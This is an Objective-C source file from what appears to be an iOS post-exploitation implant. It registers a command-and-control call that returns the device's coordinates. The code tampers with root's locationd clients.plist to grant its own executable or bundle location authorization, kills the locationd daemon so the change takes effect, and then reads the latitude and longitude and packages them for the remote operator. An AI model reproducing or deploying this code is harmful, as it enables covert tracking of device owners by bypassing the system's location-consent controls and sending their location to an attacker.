/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#ifndef _LOCATE_H_
#define _LOCATE_H_

#import <objc/runtime.h>
#import <CoreLocation/CoreLocation.h>

#include <api.h>
#include <c2.h>
#include <tlv.h>
#include <tlv_types.h>
#include <proc.h>
#include <core.h>

#include <sigar.h>

#define LOCATE_BASE 8

#define LOCATE_LOCATION_GET \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       LOCATE_BASE, \
                       API_CALL)

#define TLV_TYPE_LONGITUDE TLV_TYPE_CUSTOM(TLV_TYPE_STRING, LOCATE_BASE, API_TYPE)
#define TLV_TYPE_LATITUDE  TLV_TYPE_CUSTOM(TLV_TYPE_STRING, LOCATE_BASE, API_TYPE + 1)

@interface CLLocationManager (Undocumented)
+(id)sharedManager;
@end

static int kill_locationd(sigar_t *sigar)
{
    sigar_pid_t pid;

    if ((pid = proc_find(sigar, "locationd")) == -1)
    {
        return -1;
    }

    proc_kill(sigar, pid);
    return pid;
}

static int perform_locationd_bypass(sigar_t *sigar, NSString *executable, NSString *bundle)
{
    NSString *clients;
    NSString *client;

    NSMutableDictionary *plist;
    NSMutableDictionary *permissions;

    @autoreleasepool
    {
        clients = @"/private/var/root/Library/Caches/locationd/clients.plist";

        if (executable != NULL)
        {
            client = [NSString stringWithFormat:@"com.apple.locationd.executable-%@", executable];
            log_debug("* Performing locationd bypass for executable (%s)\n", [executable UTF8String]);
        }
        else if (bundle != NULL)
        {
            client = bundle;
            log_debug("* Performing locationd bypass for bundle (%s)\n", [client UTF8String]);
        }
        else
        {
            return -1;
        }

        plist = [[NSMutableDictionary alloc] initWithContentsOfFile:clients];
        permissions = [NSMutableDictionary new];

        [permissions setValue:@4 forKey:@"Authorization"];
        [plist setValue:permissions forKey:client];
        [plist writeToFile:clients atomically:YES];

        kill_locationd(sigar);

        log_debug("* Cooling down (locationd should reign)\n");
        sleep(5);
    }

    return 0;
}

tlv_pkt_t *locate_location_get(c2_t *c2)
{
    int stat;

    core_t *core;
    tlv_pkt_t *result;
    CLLocationManager *manager;
    CLLocation *location;
    CLLocationCoordinate2D coordinate;

    NSString *executable;
    NSString *latitude;
    NSString *longitude;

    core = c2->data;

#ifdef IS_BUNDLE
    stat = perform_locationd_bypass(core->sigar, NULL, [[NSBundle mainBundle] bundleIdentifier]);
#else
    executable = [NSString stringWithFormat:@"%s", core->path];
    stat = perform_locationd_bypass(core->sigar, executable, NULL);
#endif

    if (stat == -1)
    {
        log_debug("* locationd bypass failed with error code (%d)\n", stat);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    manager = [CLLocationManager sharedManager];
    [manager startUpdatingLocation];

    location = [manager location];
    coordinate = [location coordinate];

    latitude = [NSString stringWithFormat:@"%f", coordinate.latitude];
    longitude = [NSString stringWithFormat:@"%f", coordinate.longitude];

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

    tlv_pkt_add_string(result, TLV_TYPE_LATITUDE, (char *)[latitude UTF8String]);
    tlv_pkt_add_string(result, TLV_TYPE_LONGITUDE, (char *)[longitude UTF8String]);

    return result;
}

void register_locate_api_calls(api_calls_t **api_calls)
{
    api_call_register(api_calls, LOCATE_LOCATION_GET, locate_location_get);
}

#endif